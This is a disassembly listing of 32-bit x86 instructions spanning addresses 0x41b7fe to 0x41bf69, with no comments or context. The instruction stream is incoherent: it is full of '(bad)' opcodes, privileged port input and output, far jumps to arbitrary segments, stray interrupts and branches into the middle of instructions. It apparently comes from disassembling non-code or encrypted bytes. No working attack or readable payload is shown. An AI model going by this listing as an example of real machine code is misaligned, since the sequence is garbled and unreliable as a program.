  41b7fe:	out    dx,al
  41b7ff:	pusha  
  41b800:	inc    esp
  41b801:	cwde   
  41b802:	sbb    al,0x7
  41b804:	sahf   
  41b805:	mov    edx,0xff1e94e2
  41b80a:	push   cs
  41b80b:	ins    DWORD PTR es:[edi],dx
  41b80c:	ins    DWORD PTR es:[edi],dx
  41b80d:	xor    BYTE PTR [eax],ch
  41b80f:	rcl    BYTE PTR [esi-0x1f],cl
  41b812:	cmp    eax,0xf2dc6fa9
  41b817:	bound  edi,QWORD PTR [esi+0x7ff2cc25]
  41b81d:	xor    eax,0xe47bf5fc
  41b822:	enter  0x2165,0x6a
  41b826:	push   esi
  41b827:	out    0xe8,al
  41b829:	ds (bad) 
  41b82b:	outs   dx,DWORD PTR ds:[esi]
  41b82c:	pop    edx
  41b82d:	popa   
  41b82e:	pop    es
  41b82f:	mov    ebp,DWORD PTR [edx+0x2d]
  41b832:	call   0xc22a:0x129b3008
  41b839:	add    al,BYTE PTR [ecx]
  41b83b:	fwait
  41b83c:	dec    esi
  41b83d:	pop    eax
  41b83e:	sti    
  41b83f:	inc    ecx
  41b840:	pop    esp
  41b841:	pop    ebp
  41b842:	ins    DWORD PTR es:[edi],dx
  41b843:	mov    ecx,DWORD PTR [ecx]
  41b845:	sub    BYTE PTR [ecx+ebx*8],0xef
  41b849:	pop    es
  41b84a:	in     eax,0x81
  41b84c:	xor    esp,DWORD PTR [esi+ecx*2-0x6e8e4908]
  41b853:	sbb    bh,BYTE PTR [edi+0x44]
  41b856:	and    eax,0x2913be4b
  41b85b:	lods   al,BYTE PTR ds:[esi]
  41b85c:	dec    edi
  41b85d:	inc    ecx
  41b85e:	ret    0x3b40
  41b861:	dec    ecx
  41b862:	into   
  41b863:	ins    DWORD PTR es:[edi],dx
  41b864:	sbb    ebp,ecx
  41b866:	xlat   BYTE PTR ds:[ebx]
  41b867:	fadd   QWORD PTR [eax-0x2152be20]
  41b86d:	dec    edi
  41b86e:	lahf   
  41b86f:	je     0x41b84a
  41b871:	retf   
  41b872:	fmul   st(6),st
  41b874:	xchg   ecx,eax
  41b875:	add    DWORD PTR [ebx+0x3d],esp
  41b878:	cmc    
  41b879:	and    dh,bh
  41b87b:	les    ecx,FWORD PTR [ebp+0x20b520b5]
  41b881:	adc    BYTE PTR [eax+0x44],bl
  41b884:	stos   DWORD PTR es:[edi],eax
  41b885:	dec    ebx
  41b886:	or     BYTE PTR [ecx+0x2cf06a38],cl
  41b88c:	shl    ebx,0x15
  41b88f:	ret    0x9eac
  41b892:	dec    ebx
  41b893:	mov    WORD PTR [esi-0x7a15e34],ds
  41b899:	sbb    ch,BYTE PTR [ecx+0x43]
  41b89c:	jns    0x41b81f
  41b89e:	sub    dh,0x6
  41b8a1:	or     ah,al
  41b8a3:	int    0x8d
  41b8a5:	inc    eax
  41b8a6:	inc    edi
  41b8a7:	pop    ds
  41b8a8:	nop
  41b8a9:	repnz adc BYTE PTR [edi+0x72],dl
  41b8ad:	mov    ds:0x9732091,eax
  41b8b2:	popa   
  41b8b3:	loope  0x41b8b4
  41b8b5:	dec    ebx
  41b8b6:	(bad)  
  41b8b7:	hlt    
  41b8b8:	xor    eax,0x5323af39
  41b8bd:	xchg   edx,eax
  41b8be:	cmp    BYTE PTR cs:[ebp-0x7d],cl
  41b8c2:	xchg   esp,eax
  41b8c3:	xor    ch,dl
  41b8c5:	adc    cl,BYTE PTR [ebx-0x5f2ae72]
  41b8cb:	mov    esi,0xffc685e5
  41b8d0:	(bad)  
  41b8d1:	lahf   
  41b8d2:	add    eax,0x9e14fb2e
  41b8d7:	scas   al,BYTE PTR es:[edi]
  41b8d8:	aad    0x66
  41b8da:	sbb    DWORD PTR [ebp-0x1b6cfc2d],edx
  41b8e0:	fisub  WORD PTR [ecx+edx*8]
  41b8e3:	pop    ebx
  41b8e4:	jnp    0x41b944
  41b8e6:	jmp    0xb9e0:0x7b3b654d
  41b8ed:	(bad)  
  41b8ee:	stos   DWORD PTR es:[edi],eax
  41b8ef:	in     eax,dx
  41b8f0:	addr16 add eax,0x55a80fff
  41b8f6:	fs aam 0xbb
  41b8f9:	ficomp DWORD PTR [esi+0x1d]
  41b8fc:	jo     0x41b919
  41b8fe:	xchg   DWORD PTR [ecx+eiz*8+0x32],edi
  41b902:	rol    BYTE PTR [ecx+0x371d57ab],cl
  41b908:	jno    0x41b8c2
  41b90a:	hlt    
  41b90b:	xchg   edx,eax
  41b90c:	imul   esp,edx,0xc6e2108b
  41b912:	jmp    0xcf6c:0xd79fb44b
  41b919:	pop    ds
  41b91a:	aaa    
  41b91b:	adc    DWORD PTR [edx+ebx*1],edx
  41b91e:	rcl    DWORD PTR ds:0x9cbd14a1,0x4a
  41b925:	mov    ah,0xff
  41b927:	lahf   
  41b928:	jle    0x41b8ca
  41b92a:	pop    ss
  41b92b:	lock sbb BYTE PTR [eax+0x19],ch
  41b92f:	jmp    0x604f:0x2613501a
  41b936:	out    dx,eax
  41b937:	lea    edx,[edx]
  41b939:	jecxz  0x41b937
  41b93b:	cmp    BYTE PTR [edi+ebx*1-0x6b793187],ah
  41b942:	push   ss
  41b943:	shr    dl,cl
  41b945:	shr    DWORD PTR [ecx],1
  41b947:	test   al,0x1b
  41b949:	sbb    BYTE PTR [ebx-0x7e441891],dl
  41b94f:	push   edi
  41b950:	(bad)  
  41b951:	jns    0x41b908
  41b953:	fist   DWORD PTR [edi]
  41b955:	rol    BYTE PTR [esi-0x301e2b43],1
  41b95b:	loope  0x41b930
  41b95d:	xchg   edi,eax
  41b95e:	clc    
  41b95f:	fisttp DWORD PTR [edi+0x4f289201]
  41b965:	inc    esi
  41b966:	jb     0x41b936
  41b968:	push   edx
  41b969:	fdivr  DWORD PTR [ebx-0x52]
  41b96c:	(bad)  
  41b96d:	mov    edx,0xebe5a17
  41b972:	div    BYTE PTR [eax+esi*2+0x20dfb9f3]
  41b979:	add    esi,DWORD PTR [ebp+0x3e]
  41b97c:	dec    ebp
  41b97d:	jbe    0x41b969
  41b97f:	dec    esp
  41b980:	iret   
  41b981:	inc    edx
  41b982:	in     eax,0x77
  41b984:	ins    BYTE PTR es:[edi],dx
  41b985:	cmp    BYTE PTR [ebx+0x124187a6],0xe8
  41b98c:	out    0x84,al
  41b98e:	jp     0x41b92a
  41b990:	pop    es
  41b991:	and    DWORD PTR [eax+0x4a],eax
  41b994:	pop    ss
  41b995:	fld    DWORD PTR [ebp+0x46b465d3]
  41b99b:	add    bh,BYTE PTR [eax-0x7]
  41b99e:	pop    ecx
  41b99f:	rcr    ch,0x8a
  41b9a2:	fst    QWORD PTR [edx]
  41b9a4:	push   eax
  41b9a5:	in     al,dx
  41b9a6:	or     edx,DWORD PTR gs:[edi+0x18]
  41b9aa:	mov    ecx,DWORD PTR [esi]
  41b9ac:	daa    
  41b9ad:	add    BYTE PTR [edx+0xa],al
  41b9b0:	sbb    al,0x14
  41b9b2:	xchg   esp,eax
  41b9b3:	or     eax,0xcd89025c
  41b9b8:	ds inc eax
  41b9ba:	push   edx
  41b9bb:	sbb    ch,0xe3
  41b9be:	add    ebp,DWORD PTR [esi-0x78]
  41b9c1:	sub    al,0xcb
  41b9c3:	push   ebp
  41b9c4:	jmp    0xa41527de
  41b9c9:	lahf   
  41b9ca:	inc    edi
  41b9cb:	mov    cl,0x72
  41b9cd:	(bad)  
  41b9ce:	imul   esp,DWORD PTR [eax-0x58],0x617af75
  41b9d5:	mov    esp,DWORD PTR [ecx]
  41b9d7:	dec    esi
  41b9d8:	sahf   
  41b9d9:	bound  esi,QWORD PTR [esi+0x5c6ce86]
  41b9df:	sub    ebx,0xffffffe9
  41b9e2:	push   ebp
  41b9e3:	pushf  
  41b9e4:	jp     0x41b9fd
  41b9e6:	int    0xf8
  41b9e8:	rcl    DWORD PTR [ecx+ecx*8-0x6b],cl
  41b9ec:	ror    BYTE PTR es:[edx-0x74],0x46
  41b9f1:	mov    bh,0x3b
  41b9f3:	sbb    bh,BYTE PTR [ecx+eiz*1]
  41b9f6:	fisttp DWORD PTR [eax+eiz*4+0x4f]
  41b9fa:	pop    ebx
  41b9fb:	(bad)  
  41b9fc:	stos   DWORD PTR es:[edi],eax
  41b9fd:	mov    al,0x28
  41b9ff:	xor    ebp,DWORD PTR [edx-0x3757759f]
  41ba05:	adc    eax,0x1bfeb3d4
  41ba0a:	cli    
  41ba0b:	scas   eax,DWORD PTR es:[edi]
  41ba0c:	icebp  
  41ba0d:	rol    DWORD PTR [eax],cl
  41ba0f:	or     eax,0xffa02f9a
  41ba14:	shl    BYTE PTR [eax+ebx*2-0x598b833a],1
  41ba1b:	jnp    0x41ba5a
  41ba1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba1e:	xchg   esp,eax
  41ba1f:	lods   al,BYTE PTR ds:[esi]
  41ba20:	pop    esi
  41ba21:	pop    esi
  41ba22:	fdivr  DWORD PTR [esi-0x2aa2e501]
  41ba28:	inc    eax
  41ba29:	pop    ss
  41ba2a:	jle    0x41ba02
  41ba2c:	daa    
  41ba2d:	pop    ecx
  41ba2e:	mov    esi,0x120939b6
  41ba33:	fbld   TBYTE PTR [ebp+0x1]
  41ba36:	jmp    0x41ba19
  41ba38:	gs jmp 0x41baae
  41ba3b:	pop    ebp
  41ba3c:	pop    edi
  41ba3d:	addr16 fdiv st,st(3)
  41ba40:	mov    BYTE PTR [ecx+edi*8+0x66],0x73
  41ba45:	sub    bl,BYTE PTR [ebp-0x70]
  41ba48:	icebp  
  41ba49:	jo     0x41ba59
  41ba4b:	pusha  
  41ba4c:	in     al,0x26
  41ba4e:	inc    edx
  41ba4f:	adc    DWORD PTR [ebx-0x6745867],esp
  41ba55:	jno    0x41ba17
  41ba57:	jmp    0x5f2b:0x53cac57f
  41ba5e:	inc    ecx
  41ba5f:	fst    DWORD PTR [ebp-0x57976db8]
  41ba65:	sub    esp,edx
  41ba67:	jno    0x41ba0b
  41ba69:	into   
  41ba6a:	pusha  
  41ba6b:	scas   al,BYTE PTR es:[edi]
  41ba6c:	adc    eax,0x6d462403
  41ba71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba72:	push   ebx
  41ba73:	lods   eax,DWORD PTR ds:[esi]
  41ba74:	outs   dx,BYTE PTR ds:[esi]
  41ba75:	inc    ecx
  41ba76:	cs (bad) 
  41ba78:	jae    0x41ba2e
  41ba7a:	adc    ebx,esi
  41ba7c:	ins    BYTE PTR es:[edi],dx
  41ba7d:	(bad)  
  41ba7e:	outs   dx,BYTE PTR ds:[esi]
  41ba7f:	iret   
  41ba80:	ror    DWORD PTR [ebx+0x5bd55675],1
  41ba86:	xchg   ebx,eax
  41ba87:	inc    esp
  41ba88:	cmp    cl,BYTE PTR [ebp+0x64]
  41ba8b:	dec    ecx
  41ba8c:	aam    0x13
  41ba8e:	xchg   edx,eax
  41ba8f:	sub    al,0xae
  41ba91:	sub    edx,esi
  41ba93:	adc    al,0x85
  41ba95:	fcmovnu st,st(6)
  41ba97:	pusha  
  41ba98:	(bad)  
  41ba99:	fild   WORD PTR [ebx]
  41ba9b:	rcr    BYTE PTR ds:0xb4d94c3d,1
  41baa1:	aas    
  41baa2:	aaa    
  41baa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baa4:	push   edi
  41baa5:	ret    0x9f6a
  41baa8:	mov    ecx,0xdafe31a
  41baad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baae:	adc    ebp,edi
  41bab0:	fisubr DWORD PTR [ecx+0x8]
  41bab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bab5:	jae    0x41ba63
  41bab7:	rol    DWORD PTR [esi-0x40],1
  41baba:	add    al,0x1a
  41babc:	lock dec ebp
  41babe:	jl     0x41baf7
  41bac0:	mov    ecx,0xa1a43f4b
  41bac5:	shr    DWORD PTR [ebx-0x21],1
  41bac8:	loop   0x41ba4d
  41baca:	or     DWORD PTR [ebx],esi
  41bacc:	mov    dl,BYTE PTR [edx]
  41bace:	arpl   WORD PTR [esi+0x3f43c2a],bx
  41bad4:	sar    BYTE PTR [edi+edx*4-0x57],0x66
  41bad9:	adc    ch,al
  41badb:	sets   dh
  41bade:	mov    ds:0x988eeacf,eax
  41bae3:	rcl    ebp,cl
  41bae5:	sbb    eax,0x38d3eb5b
  41baea:	and    eax,0xa7c57a64
  41baef:	addr16 jmp 0x41bb57
  41baf2:	test   al,0x15
  41baf4:	dec    esp
  41baf5:	sbb    eax,0x3bbf6bc6
  41bafa:	pop    es
  41bafb:	inc    edx
  41bafc:	cmc    
  41bafd:	orps   xmm4,XMMWORD PTR [esi-0x9428c8e]
  41bb04:	cmc    
  41bb05:	xor    DWORD PTR [eax],0xaee593d1
  41bb0b:	and    eax,0x1e7d9b44
  41bb10:	mov    BYTE PTR [edx+0x14],dh
  41bb13:	lea    edx,[ebp-0xe94a4c5]
  41bb19:	sbb    bl,dl
  41bb1b:	adc    edx,DWORD PTR [esi+ecx*8]
  41bb1e:	or     al,0x9
  41bb20:	xor    esp,DWORD PTR [ecx]
  41bb22:	stos   BYTE PTR es:[edi],al
  41bb23:	ja     0x41bad2
  41bb25:	cld    
  41bb26:	jmp    0x86e6:0xbc81b806
  41bb2d:	mov    ecx,0x1bb58cbc
  41bb32:	lock lods al,BYTE PTR ds:[esi]
  41bb34:	test   al,0x98
  41bb36:	(bad)  [esi]
  41bb38:	sar    BYTE PTR [ebx],1
  41bb3a:	or     al,0x3a
  41bb3c:	(bad)  
  41bb3e:	cwde   
  41bb3f:	xchg   ebp,eax
  41bb40:	push   0x481169a1
  41bb45:	in     eax,dx
  41bb46:	scas   al,BYTE PTR es:[edi]
  41bb47:	popa   
  41bb48:	jb     0x41bb12
  41bb4a:	jl     0x41bbab
  41bb4c:	adc    eax,0x6a09d123
  41bb51:	(bad)  
  41bb52:	addr16 push ebp
  41bb54:	pop    es
  41bb55:	call   0xca70d6be
  41bb5a:	xor    eax,0x4752d6b
  41bb5f:	mov    dh,0xb5
  41bb61:	jno    0x41bbb5
  41bb63:	cmp    dh,BYTE PTR [edx-0x36055c52]
  41bb69:	jge    0x41baee
  41bb6b:	adc    BYTE PTR [ecx+0x5a],dl
  41bb6e:	jmp    0x7f22cec8
  41bb73:	loopne 0x41bb28
  41bb75:	pop    ds
  41bb76:	repnz int 0x94
  41bb79:	push   esp
  41bb7a:	jecxz  0x41bbb1
  41bb7c:	cmp    DWORD PTR [edx+0x6d0ac6b4],ebx
  41bb82:	ja     0x41bbb9
  41bb84:	out    dx,al
  41bb85:	ret    
  41bb86:	pusha  
  41bb87:	cwde   
  41bb88:	mov    es,WORD PTR [edx-0x37f7554a]
  41bb8e:	jge    0x41bbfb
  41bb90:	nop
  41bb91:	xor    DWORD PTR [ebx+0x2e83326d],ecx
  41bb97:	out    dx,eax
  41bb98:	imul   eax,DWORD PTR [edi+esi*4-0x1],0xffffff82
  41bb9d:	cmp    edi,eax
  41bb9f:	or     BYTE PTR ds:[ecx+0x23],bh
  41bba3:	icebp  
  41bba4:	cmp    DWORD PTR [eax+eax*1+0xb],0x88ae8386
  41bbac:	loope  0x41bb60
  41bbae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbaf:	jg     0x41bb85
  41bbb1:	adc    eax,0xeab34a01
  41bbb6:	in     al,0x79
  41bbb8:	mov    esi,0x78aad1d4
  41bbbd:	pusha  
  41bbbe:	stos   DWORD PTR es:[di],eax
  41bbc0:	jecxz  0x41bbf0
  41bbc2:	sbb    edi,DWORD PTR [edx]
  41bbc4:	sbb    eax,0x5cbddd50
  41bbc9:	xlat   BYTE PTR ds:[ebx]
  41bbca:	dec    esp
  41bbcb:	(bad)  
  41bbcc:	dec    edx
  41bbcd:	xchg   esp,eax
  41bbce:	jb     0x41bc1f
  41bbd0:	xor    BYTE PTR [ebx],dl
  41bbd2:	mov    esp,0x4a7e6bb8
  41bbd7:	lahf   
  41bbd8:	js     0x41bc23
  41bbda:	mov    edx,0xae210f6b
  41bbdf:	in     al,dx
  41bbe0:	push   ds
  41bbe1:	aad    0x82
  41bbe3:	mov    al,BYTE PTR [ebx+edi*4]
  41bbe6:	jae    0x41bc1d
  41bbe8:	clc    
  41bbe9:	leave  
  41bbea:	dec    edi
  41bbeb:	mov    bl,0x2c
  41bbed:	icebp  
  41bbee:	hlt    
  41bbef:	(bad)  
  41bbf3:	jecxz  0x41bc0a
  41bbf5:	xor    eax,0x120c6b80
  41bbfa:	add    eax,0xae4791d2
  41bbff:	enter  0x8a6e,0x3e
  41bc03:	lock push edi
  41bc05:	test   BYTE PTR [esi-0x13b8d3ac],dh
  41bc0b:	sar    esp,0x71
  41bc0e:	jbe    0x41bbae
  41bc10:	mov    edx,0x432c73fd
  41bc15:	lods   eax,DWORD PTR ds:[esi]
  41bc16:	add    al,0x7a
  41bc18:	push   eax
  41bc19:	pusha  
  41bc1a:	imul   DWORD PTR [ebx]
  41bc1c:	jecxz  0x41bc8b
  41bc1e:	xchg   edx,eax
  41bc1f:	cmp    ebp,ecx
  41bc21:	and    DWORD PTR [edx-0x29],edi
  41bc24:	dec    esi
  41bc25:	sub    ebx,ecx
  41bc27:	out    dx,al
  41bc28:	outs   dx,BYTE PTR ds:[esi]
  41bc2a:	adc    BYTE PTR [edi-0x6a86a3e5],ch
  41bc30:	dec    esi
  41bc31:	out    dx,al
  41bc32:	push   cs
  41bc33:	inc    ebp
  41bc34:	xor    eax,0x310baf1e
  41bc39:	hlt    
  41bc3a:	fld    DWORD PTR [ecx+0x67079a13]
  41bc40:	aaa    
  41bc41:	add    al,0xa7
  41bc43:	mov    al,ds:0x82a5ac7c
  41bc48:	mov    esi,0xb8ac36cb
  41bc4d:	mov    ebx,0xb2d90414
  41bc52:	xchg   ebp,eax
  41bc53:	test   DWORD PTR [edx],edx
  41bc55:	les    esp,FWORD PTR [ebx-0x774bc2f0]
  41bc5b:	jmp    0xd2d:0xf43e847
  41bc62:	cmp    edi,DWORD PTR [ecx]
  41bc64:	jl     0x41bcd1
  41bc66:	fwait
  41bc67:	inc    edx
  41bc68:	(bad)
  41bc6c:	outs   dx,BYTE PTR ds:[esi]
  41bc6d:	xchg   esp,eax
  41bc6e:	aam    0xf0
  41bc70:	aaa    
  41bc71:	sub    dh,BYTE PTR gs:[ebp-0x44f11c76]
  41bc78:	cs adc eax,0x56d02f76
  41bc7e:	retf   
  41bc7f:	cmp    DWORD PTR [edi],edx
  41bc81:	das    
  41bc82:	pop    ecx
  41bc83:	inc    esi
  41bc84:	pop    esi
  41bc85:	imul   esi,edi,0xffffff88
  41bc88:	sub    ax,0x67e2
  41bc8c:	fcom   st(5)
  41bc8e:	inc    edx
  41bc8f:	and    dh,BYTE PTR [ebx-0x50]
  41bc92:	cli    
  41bc93:	jno    0x41bcbe
  41bc95:	gs ins BYTE PTR es:[edi],dx
  41bc97:	loopne 0x41bcdc
  41bc99:	or     ah,BYTE PTR [eax+0x3147e73d]
  41bc9f:	push   ds
  41bca0:	cwde   
  41bca1:	mov    ecx,0xa4b31d23
  41bca6:	cwde   
  41bca7:	mov    al,0x9c
  41bca9:	cmp    eax,0x8991e40d
  41bcae:	mov    eax,esi
  41bcb0:	sti    
  41bcb1:	retf   0xbe3f
  41bcb4:	push   edx
  41bcb5:	push   edi
  41bcb6:	in     al,dx
  41bcb7:	gs (bad) 
  41bcb9:	mov    esi,0x3a5c678a
  41bcbe:	push   cs
  41bcbf:	push   es
  41bcc0:	icebp  
  41bcc1:	addr16 int 0xa1
  41bcc4:	xor    DWORD PTR [ebx-0x12],edi
  41bcc7:	clc    
  41bcc8:	adc    DWORD PTR [esi-0x221292b7],esp
  41bcce:	fcom   DWORD PTR [edi]
  41bcd0:	imul   ebp,DWORD PTR [ecx+0x1f750350],0x51
  41bcd7:	out    dx,eax
  41bcd8:	aam    0x22
  41bcda:	and    eax,0x9025fdc
  41bcdf:	jbe    0x41bc7c
  41bce1:	sar    DWORD PTR [ecx],1
  41bce3:	int3   
  41bce4:	mov    DWORD PTR [ebp+0x44a7e459],edx
  41bcea:	dec    ecx
  41bceb:	jne    0x41bd5c
  41bced:	mov    eax,0xa4b56c8e
  41bcf2:	xchg   edx,eax
  41bcf3:	mov    cl,0xaa
  41bcf5:	mov    dh,0x2d
  41bcf7:	int3   
  41bcf8:	call   0xfa8c:0x870c83a1
  41bcff:	mov    ebx,0x1bef9b48
  41bd04:	jo     0x41bcd1
  41bd06:	cdq    
  41bd07:	fld    QWORD PTR [ecx+0x11]
  41bd0a:	jae    0x41bc9c
  41bd0c:	inc    esi
  41bd0d:	jge    0x41bd84
  41bd0f:	pop    eax
  41bd10:	adc    DWORD PTR [ebp+0xa],ebx
  41bd13:	push   es
  41bd14:	or     BYTE PTR [ebx],dh
  41bd16:	gs mov ebx,0x67232623
  41bd1c:	jg     0x41bca0
  41bd1e:	mov    eax,ds:0x69da86a5
  41bd23:	inc    ebx
  41bd24:	ret    0x7633
  41bd27:	xchg   edi,eax
  41bd28:	aam    0x95
  41bd2a:	sub    eax,DWORD PTR [esi]
  41bd2c:	mov    WORD PTR [ecx+edx*8-0x65],cs
  41bd30:	sahf   
  41bd31:	jbe    0x41bd18
  41bd33:	inc    ebx
  41bd34:	mov    al,0xea
  41bd36:	mov    ecx,0x9c0a5f5c
  41bd3b:	icebp  
  41bd3c:	xor    eax,ebp
  41bd3e:	aas    
  41bd3f:	pusha  
  41bd40:	int    0xdc
  41bd42:	fldcw  WORD PTR [esi+esi*2]
  41bd45:	ret    
  41bd46:	neg    bh
  41bd48:	and    DWORD PTR [edi],ebp
  41bd4a:	xchg   ebp,eax
  41bd4b:	arpl   WORD PTR [eax-0xc92fff7],di
  41bd51:	cmp    bl,bh
  41bd53:	(bad)  
  41bd54:	stc    
  41bd55:	mov    dl,0x24
  41bd57:	jae    0x41bd54
  41bd59:	push   ss
  41bd5a:	sbb    al,0x1e
  41bd5c:	cmp    bl,BYTE PTR [ecx-0x28]
  41bd5f:	nop
  41bd60:	push   0xffffffb9
  41bd62:	aam    0x52
  41bd64:	les    esi,FWORD PTR [esi]
  41bd66:	fcmovnbe st,st(2)
  41bd68:	push   edi
  41bd69:	jmp    0xef3146e3
  41bd6e:	ror    edi,cl
  41bd70:	jge    0x41bd49
  41bd72:	inc    ebx
  41bd73:	sbb    al,bh
  41bd75:	xor    DWORD PTR [ebx-0x33],ebp
  41bd78:	fwait
  41bd79:	xor    ebp,DWORD PTR [esi+eax*8-0x67]
  41bd7d:	loope  0x41bd39
  41bd7f:	scas   eax,DWORD PTR es:[edi]
  41bd80:	outs   dx,BYTE PTR ds:[esi]
  41bd81:	jg     0x41bd6f
  41bd83:	int3   
  41bd84:	push   es
  41bd85:	mov    ch,0x3a
  41bd87:	jb     0x41bde1
  41bd89:	test   al,0x42
  41bd8b:	aad    0xa4
  41bd8d:	lock int 0xd8
  41bd90:	inc    ebp
  41bd91:	sahf   
  41bd92:	test   al,0x52
  41bd94:	dec    esp
  41bd95:	jmp    0x41be14
  41bd97:	hlt    
  41bd98:	test   DWORD PTR [ebp+0x2e],ebp
  41bd9b:	mov    ch,0x73
  41bd9d:	cmp    DWORD PTR [edx+0x28044002],eax
  41bda3:	in     eax,dx
  41bda4:	lock fst DWORD PTR [esi-0x51927e04]
  41bdab:	mov    ecx,0xb36df304
  41bdb0:	ins    DWORD PTR es:[edi],dx
  41bdb1:	sub    edx,esi
  41bdb3:	push   ebp
  41bdb4:	mov    edi,0xe2c11938
  41bdb9:	lds    esi,FWORD PTR [edx]
  41bdbb:	jae    0x41be10
  41bdbd:	inc    ebx
  41bdbe:	mov    eax,ds:0xe76b0d2
  41bdc3:	out    0xf4,eax
  41bdc5:	(bad)  
  41bdc6:	repz push ebx
  41bdc8:	es pop esp
  41bdca:	pop    ebx
  41bdcb:	pop    edx
  41bdcc:	not    BYTE PTR [edx-0x6]
  41bdcf:	jmp    0x41bd6d
  41bdd1:	(bad)  
  41bdd2:	rcl    DWORD PTR [eax+0x7f188a2b],0x65
  41bdd9:	mov    ds:0x3ec9dd11,al
  41bdde:	outs   dx,BYTE PTR ds:[esi]
  41bddf:	clc    
  41bde0:	std    
  41bde1:	fdivrp st(6),st
  41bde3:	cli    
  41bde4:	jecxz  0x41be16
  41bde6:	test   eax,0xa2d99871
  41bdeb:	outs   dx,BYTE PTR fs:[esi]
  41bded:	mov    fs,edx
  41bdef:	mov    eax,ds:0x5019841c
  41bdf4:	mov    edi,0x9c139c41
  41bdf9:	mov    al,ds:0x995b7f5
  41bdfe:	in     al,dx
  41bdff:	add    bh,dh
  41be01:	retf   
  41be02:	mov    edx,0x8d0938fc
  41be07:	jb     0x41bdb8
  41be09:	daa    
  41be0a:	ficom  WORD PTR [edx-0x5b]
  41be0d:	and    eax,0x96610ed7
  41be12:	enter  0x1531,0x3e
  41be16:	mov    ch,0x90
  41be18:	clc    
  41be19:	aam    0xe3
  41be1b:	(bad)  
  41be1c:	iret   
  41be1d:	(bad)  
  41be1e:	mov    edi,0x30599e29
  41be23:	loop   0x41be0f
  41be25:	aaa    
  41be26:	fild   DWORD PTR [ecx]
  41be28:	arpl   WORD PTR [ebp-0x333afa21],cx
  41be2e:	mov    esp,0xddcf21bc
  41be33:	adc    eax,0xeee45f42
  41be38:	daa    
  41be39:	mov    gs,WORD PTR ds:0x81be8cc8
  41be3f:	sti    
  41be40:	retf   0x35ef
  41be43:	(bad)  
  41be44:	jmp    0x275db61e
  41be49:	iret   
  41be4a:	xor    ebp,DWORD PTR [eax-0x28c3c75b]
  41be50:	xor    DWORD PTR [esi-0x2cea6def],ecx
  41be56:	push   edi
  41be57:	mov    ch,0x3e
  41be59:	jns    0x41be6e
  41be5b:	or     al,0x4b
  41be5d:	test   al,0x98
  41be5f:	call   0x74e3:0x7d37a6c8
  41be66:	inc    edi
  41be67:	in     eax,0xa4
  41be69:	ins    BYTE PTR es:[edi],dx
  41be6a:	adc    eax,0xffffff9f
  41be6d:	in     eax,dx
  41be6e:	stc    
  41be6f:	or     eax,edx
  41be71:	sub    eax,0x85d0cfb8
  41be76:	lods   al,BYTE PTR ds:[esi]
  41be77:	inc    edx
  41be78:	fincstp 
  41be7a:	sbb    eax,0xdfef98c8
  41be7f:	xor    eax,0x1e45a447
  41be84:	cmp    bh,ah
  41be86:	ss loope 0x41be29
  41be89:	not    DWORD PTR [eax-0x1d]
  41be8c:	cmp    ecx,eax
  41be8e:	aas    
  41be8f:	enter  0xf94d,0x71
  41be93:	pop    edx
  41be94:	inc    ebp
  41be95:	lea    edx,[ebp+0x1c]
  41be98:	mov    ecx,0x8ebfe28c
  41be9d:	cmp    eax,0x50d81f67
  41bea2:	dec    eax
  41bea3:	stc    
  41bea4:	mov    bh,0x77
  41bea6:	ret    
  41bea7:	jb     0x41be84
  41bea9:	rol    DWORD PTR [ebp-0x82e26a3],cl
  41beaf:	je     0x41bef9
  41beb1:	and    edi,DWORD PTR [ebx-0x640c590c]
  41beb7:	mov    ds:0x242af9a0,eax
  41bebc:	or     ebp,DWORD PTR [ebx+eax*2+0x7b]
  41bec0:	dec    ebx
  41bec1:	or     ebp,esi
  41bec3:	rol    BYTE PTR [eax],cl
  41bec5:	call   0xbb1c:0x8326ba40
  41becc:	adc    DWORD PTR [edi+0x6a],esp
  41becf:	rcr    BYTE PTR [ebx],1
  41bed1:	aad    0xe7
  41bed3:	mov    ebx,0x909cb4e
  41bed8:	inc    edx
  41bed9:	jnp    0x41bec6
  41bedb:	test   BYTE PTR [ebp+0x37dcfc1b],dl
  41bee1:	push   ss
  41bee2:	xor    al,0xb4
  41bee4:	jns    0x41be9c
  41bee6:	inc    eax
  41bee7:	loope  0x41bf26
  41bee9:	cdq    
  41beea:	in     al,0x20
  41beec:	inc    cx
  41beee:	cdq    
  41beef:	das    
  41bef0:	shl    BYTE PTR [esi],0x69
  41bef3:	push   edi
  41bef4:	push   0xba788213
  41bef9:	(bad)  
  41befa:	test   bh,dl
  41befc:	ret    
  41befd:	jp     0x41be9b
  41beff:	add    DWORD PTR [edx-0x6c0461d8],eax
  41bf05:	xor    DWORD PTR [ecx+0x52],ebx
  41bf08:	(bad)  
  41bf0a:	icebp  
  41bf0b:	fisub  WORD PTR [esi+0x59]
  41bf0e:	rol    DWORD PTR [ecx],cl
  41bf10:	mov    al,ds:0x7deec79a
  41bf15:	out    dx,al
  41bf16:	cmp    edx,esp
  41bf18:	pop    ecx
  41bf19:	jle    0x41bef0
  41bf1b:	xchg   eax,esi
  41bf1d:	imul   esi,DWORD PTR [esi-0xaaa4c08],0x3
  41bf24:	out    dx,al
  41bf25:	mov    edi,0xca7e9a46
  41bf2a:	jb     0x41bf7d
  41bf2c:	shr    BYTE PTR [ebp+0x5e18847e],0xea
  41bf33:	pop    ecx
  41bf34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf35:	ins    DWORD PTR es:[edi],dx
  41bf36:	pop    ecx
  41bf37:	scas   al,BYTE PTR es:[edi]
  41bf38:	ja     0x41bf89
  41bf3a:	jecxz  0x41bed4
  41bf3c:	jo     0x41bfbb
  41bf3e:	sbb    edi,DWORD PTR [esi+0x423036f4]
  41bf44:	movlps QWORD PTR [ecx],xmm7
  41bf47:	arpl   bp,cx
  41bf49:	shl    DWORD PTR [eax+0x2fb569f5],cl
  41bf4f:	cmp    DWORD PTR [esi+0x4719e04],0xe02e3fc7
  41bf59:	lods   eax,DWORD PTR gs:[esi]
  41bf5b:	test   BYTE PTR [ebp+0x23b2d170],ah
  41bf61:	dec    edi
  41bf62:	(bad)  
  41bf63:	clc    
  41bf64:	xor    DWORD PTR [edi],ebp
  41bf66:	jle    0x41bf4d
  41bf68:	inc    ebx
  41bf69:	sbb    eax,0x9219da8b
